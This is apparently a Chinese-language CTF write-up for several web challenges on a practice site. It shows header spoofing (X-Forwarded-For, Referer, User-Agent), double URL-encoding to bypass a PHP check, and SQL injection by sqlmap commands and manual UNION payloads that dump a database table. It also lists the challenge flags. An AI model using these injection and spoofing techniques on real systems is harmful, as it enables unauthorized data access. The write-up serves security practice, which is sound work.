## 猫抓老鼠

检查请求头,发现 `content-row: MTU0Nzk5MTA1OQ==`
输入得到Flag: `KEY: #WWWnsf0cus_NET#`

## 头有点大

根据提示,抓包
伪造.NET 浏览器 国籍
修改为
```
GET /sHeader/ HTTP/1.1
Host: ctf5.shiyanbar.com
User-Agent: Mozilla/5.0 (Windows NT 6.1/.NET CLR 9.9; Win64; x64; rv:64.0) Gecko/20100101 IE
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-gb,en;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1546692582; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*185270%2CnickName%3Affdy; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1547962050
Upgrade-Insecure-Requests: 1
```
GO,得到Flag: The key is:HTTpH34der

## 貌似有点难

查看代码,发现要将IP伪装为1.1.1.1
在伪造IP后响应中提示还要伪造跳转网页
抓包
伪造IP 跳转网页
修改为
```
GET /phpaudit/ HTTP/1.1
Host: ctf5.shiyanbar.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Forwarded-For: 1.1.1.1 ##IP
Referer: https://www.google.com  ##跳转网页
Connection: close
Cookie: Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1546692582; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*185270%2CnickName%3Affdy; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1547962050
Upgrade-Insecure-Requests: 1
```
得到Flag: Key is SimCTF{daima_shengji}

## PHP大法
进入链接,看见源码
```php
<?php
if(eregi("hackerDJ",$_GET[id])) { #比较id和字符,如果相等返回true
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]); #对id进行url解密
if($_GET[id] == "hackerDJ") 如果id等于字符,得到Flag
{
  echo "<p>Access granted!</p>";
  echo "<p>flag: *****************} </p>";
}
?>


<br><br>
Can you authenticate to this website?
```
分析代码发现应对字符进行URL编码,但需要加密两次,因为浏览器会解密一次
网上的在线编码一般不会处理英文,用这个[网站](http://tool.bugku.com/safe/url.php)
GET 提交,得到 Flag: DUTCTF{PHP_is_the_best_program_language}

## 看起来有点简单!
Sql 注入题,直接用 Sqlmap 就能搞定

1. `--current-db` 发现库名为 my_db
2. `-D my_db --tables` 发现表名为 thiskey
3. `-D my_db -T thiskey --columns` 发现字段名为 k0y
4. `-D my_db -T thiskey -C k0y --dump` 得到Flag :  whatiMyD91dump

手工注入: 

1. `id=1'` 报错发现数据库类型为 MySQL 
2. `id=1 and 1=1` 与 `id=1 and 1=2` 回显不同,判断存在注入点
3. `id=1 order by 1` 3 的时候报错,说明字段数为 2
4. `id=1 union select 1,schema_name  from information_schema.schemata` 查询数据库名称发现 my_db 和 test 两个数据库
5. `id=1 union select 1,table_name from information_schema.tables where table_schema=my_db` 查询数据库中的表名 thiskey
6. `id=1 union select 1,column_name from information_schema.columns where table_schema='my_db'` 查询表中字段名,发现 k0y
7. `id=1 union select 1,k0y from thiskey` 得到Flag : whatiMyD91dump

## 
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTIwMzM0MDM3MzIsLTkxNDg3ODEwMiwxOT
A0MTgwMSwtMTgzMzIwODM5Miw0MzAxMTMyNDYsLTI2MjM0Njc2
OCw3NDI2MjM5ODAsLTI5MDI3Nzc1OCwxODAwMjYyNzYzLC04MT
U4MDU4NzgsMTg3MTg4MDgxNCw0MjI5NjgxMyw0MTA3ODc0NjUs
LTEyMTQ0NTk4MDhdfQ==
-->